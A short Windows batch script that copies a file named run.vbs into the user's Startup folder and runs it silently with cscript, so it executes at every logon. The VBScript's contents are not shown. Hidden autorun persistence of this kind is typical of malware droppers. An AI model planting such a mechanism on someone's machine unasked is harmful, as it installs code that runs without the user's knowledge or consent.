@echo off
echo F|xcopy "%cd%\run.vbs" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\run.vbs"
cscript //NoLogo //B "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\run.vbs"
exit